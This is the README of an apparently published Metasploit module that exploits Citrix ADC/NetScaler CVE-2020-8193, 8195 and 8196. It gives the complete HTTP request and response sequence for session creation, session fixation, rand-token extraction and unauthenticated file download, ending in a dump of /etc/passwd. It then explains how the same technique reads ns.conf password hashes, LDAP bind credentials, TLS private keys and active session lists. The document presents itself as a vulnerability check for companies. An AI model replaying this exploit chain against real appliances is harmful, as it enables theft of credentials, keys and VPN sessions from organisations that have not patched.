# citrix_adc_netscaler_lfi_scan

![alt text][citrix]

This Metasploit-Framework module can be use to help companies to check the last Citrix vulnerabilites (disclosed July 08, 2020).

- CVE-2020-8193
- CVE-2020-8195
- CVE-2020-8196

Public reporting on July 8th, 2020 by [Donny Maasland](https://www.linkedin.com/in/donny-maasland-13801720/) discussed [how the vulnerability could be exploited](https://dmaasland.github.io/posts/citrix.html).

As of July 10th, [RIFT](https://research.nccgroup.com/2020/07/10/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/) has confirmed that this vulnerability can be used to extract valid VPN sessions from a vulnerable instance.

Read more about from Twitter:

- [Citrix Issues Critical Patches for 11 New Flaws Affecting Multiple Products](https://cybersecurityreviews.net/2020/07/12/citrix-issues-critical-patches-for-11-new-flaws-affecting-multiple-products/)
- [Hackers Actively Scanning & Constantly Attempt To Exploit Citrix ADC Vulnerabilities](https://bkhackers-on-security.blogspot.com/2020/07/hackers-actively-scanning-constantly.html)

## Requests

### 0x1 create_session (initiate)

First, you need to get the session ID.

```
POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
Host: 192.168.7.2
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
X-NITRO-USER: LCGSfX
X-NITRO-PASS: fYiZon
Content-Type: application/xml
Content-Length: 44
Connection: close

<appfwprofile><login></login></appfwprofile>
```

```
HTTP/1.1 406 Not Acceptable
Date: Tue, 14 Jul 2020 09:13:23 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Set-Cookie: SESSID=b4f86e3ab3df3f666eaf0b618502a7b5; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 4489
Connection: close
Content-Type: application/xml; charset=utf-8
```

### 0x2 fix_session_rand

Then, you need to fix the session. You can take advantage of this step to obtain the `rand` value (and save yourself an additional request to `/menu/stc`).

```
GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
Host: 192.168.7.2
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Cookie: SESSID=b4f86e3ab3df3f666eaf0b618502a7b5;
Content-Type: application/x-www-form-urlencoded
Connection: close
```

```
HTTP/1.1 302 Found
Date: Tue, 14 Jul 2020 09:13:27 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: is_cisco_platform=0; expires=Fri, 09-Jul-2021 09:13:27 GMT; Max-Age=31104000; path=/; HttpOnly
Location: /menu/neo
X-XSS-Protection: 1; mode=block
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

You need to follow the redirect.

```
GET /menu/neo HTTP/1.1
Host: 192.168.7.2
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Cookie: SESSID=b4f86e3ab3df3f666eaf0b618502a7b5;
Content-Type: application/x-www-form-urlencoded
Connection: close
```

And get the rand value from body response.

```
HTTP/1.1 200 OK
Date: Tue, 14 Jul 2020 09:13:30 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: startupapp=neo; expires=Fri, 09-Jul-2021 09:13:30 GMT; Max-Age=31104000; path=/; HttpOnly
Vary: Accept-Encoding
X-XSS-Protection: 1; mode=block
Content-Length: 1590
Connection: close
Content-Type: text/html;application/octet-stream;application/ecmascript;application/json;application/xml;charset=UTF-8

<!DOCTYPE html PUBLIC "-//W3C//DTD XDEV_HTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Citrix ADC - Configuration</title>
<script type="text/javascript">var neo_logout_url = "/menu/lo?rand=478257144.1894793017920341";</script>
<script type="text/javascript">var neo_machine_sysid = "450092";var rand = "478257144.1894793017920341";var partition_dir = "";var is_ha_supported_in_gui = "true";var login_warning = "";</script>
<script type="text/javascript">var global_data = "{global_data}";</script>
<link href="/admin_ui/rdx/core/css/rdx.css" rel="stylesheet" type="text/css"/>
<link href="/admin_ui/neo/css/neo.css" rel="stylesheet" type="text/css"/>
<!--[if IE]> <style type="text/css"> .form td input[type="submit"] { width: 50px; } </style> <![endif]-->
<script type="text/javascript" src="/admin_ui/rdx/core/js/rdx.js"></script>
<script type="text/javascript" src="/menu/branding"></script>
<script type="text/javascript" src="/menu/neoglobaldata"></script>
<script type="text/javascript" src="/menu/neoa?gui_token=478257144.1894793017920341"></script>
<script type="text/javascript" src="/admin_ui/neo/js/neo.js"></script>
<script type="text/javascript" src="/admin_ui/neo/js/epa_expression_data_win.js"></script>
<script type="text/javascript" src="/admin_ui/neo/js/epa_expression_data_mac.js"></script>
</head>
<body class="ns_body">
</body>
</html>
```

### 0x3 create_session (breaking)

```
POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
Host: 192.168.7.2
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Cookie: SESSID=b4f86e3ab3df3f666eaf0b618502a7b5;
X-NITRO-USER: PjdFbLCc
X-NITRO-PASS: xyFoLmXD
Content-Type: application/xml
Content-Length: 44
Connection: close

<appfwprofile><login></login></appfwprofile>
```

```
HTTP/1.1 406 Not Acceptable
Date: Tue, 14 Jul 2020 09:13:33 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 4489
Connection: close
Content-Type: application/xml; charset=utf-8
```

### 0x4 read_lfi

```
POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
Host: 192.168.7.2
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Cookie: SESSID=b4f86e3ab3df3f666eaf0b618502a7b5;
X-NITRO-USER: UGjkHm
X-NITRO-PASS: NbIEBHxw
rand_key: 478257144.1894793017920341
Content-Type: application/xml
Content-Length: 31
Connection: close

<clipermission></clipermission>
```

```
HTTP/1.1 406 Not Acceptable
Date: Tue, 14 Jul 2020 09:13:37 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Expires: -1
Cache-Control: private, must-revalidate, post-check=0, pre-check=0
Pragma: private
Content-Disposition: attachment;filename="passwd"
Accept-Ranges: bytes
Content-Length: 465
X-XSS-Protection: 1; mode=block
Connection: close
Content-Type: application/octet-stream

root:*:0:0:Charlie &:/root:/usr/bin/bash
nsroot:*:0:0:Netscaler Root:/root:/netscaler/nssh
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
nsmonitor:*:65532:65534:Netscaler Monitoring user:/var/nstmp/monitors:/usr/sbin/nologin
```

## Exploit Development and Impact

An attacker can take advantage of this vulnerability to obtain sensitive information on vulnerable Citrix systems.

A small overview of what we observed on a `Citrix Netscaler 12.1 build 55.18`.

- Possibility to read `/nsconfig/ns.conf`:

 > This is the configuration file for the Netscaler. It contains the hashes of users authorized to connect to the Netscaler in SSH (including the user nsroot).
 > This file also contain other information such as that used to bind an Active Directory (for example).
 >
 > A few interesting output:

 ```
 set system user nsroot 35b7a39540c7f42a4c85455a750fed309e506d6d83fcaae83 -encrypted -hashmethod SHA1
 add authentication ldapAction 192.168.7.3_LDAP -serverIP 192.168.7.3 -serverPort 636 -ldapBase "DC=prod,DC=contoso,DC=com" -ldapBindDn netscaler@prod.contoso.com -ldapBindDnPassword 36e2fd1867ca398c68f45c7c54dfa56988c3464ff2a3acf48887091292fb58f5 -encrypted -encryptmethod ENCMTHD_3 -ldapLoginName
 add ssl certKey ns-server-certificate -cert ns-server.cert -key ns-server.key
 ```

![alt text][nsconfig]

- Possibility to read `/nsconfig/ssl/ns-server.key` (and all others certificate files):

 > It's certificate key for TLS.

![alt text][privkey]

 - Capability to list `/var/nstmp` directory:

 > It is generally not common to list directories from an LFI. An attacker can use that to "find their way" in the file system. The `/var/nstmp` directory contains the list of active sessions.

![alt text][sessions]

## Vulnerable Systems

[CVE-2020-8193](https://nvd.nist.gov/vuln/detail/CVE-2020-8193): Improper access control in Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 allows unauthenticated access to certain URL endpoints.

<u>CVSS 3.x severity and metrics:</u>

 - Base score: 6.5 (MEDIUM)
 - Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N

[CVE-2020-8195](https://nvd.nist.gov/vuln/detail/CVE-2020-8195): Improper input validation in Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 resulting in limited information disclosure to low privileged users.

<u>CVSS 3.x severity and metrics:</u>

 - Base score: 6.5 (MEDIUM)
 - Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

[CVE-2020-8196](https://nvd.nist.gov/vuln/detail/CVE-2020-8196): Improper access control in Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 resulting in limited information disclosure to low privileged users.

<u>CVSS 3.x severity and metrics:</u>

 - Base score: 4.3 (MEDIUM)
 - Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N

[citrix]: https://github.com/Zeop-CyberSec/citrix_adc_netscaler_lfi/raw/master/pictures/clipboard_01.jpg "Citrix banner"
[nsconfig]: https://github.com/Zeop-CyberSec/citrix_adc_netscaler_lfi/raw/master/pictures/clipboard_02.png "Show ns.conf"
[privkey]: https://github.com/Zeop-CyberSec/citrix_adc_netscaler_lfi/raw/master/pictures/clipboard_03.png "Show TLS private key"
[sessions]: https://github.com/Zeop-CyberSec/citrix_adc_netscaler_lfi/raw/master/pictures/clipboard_04.png "Show active session(s)"
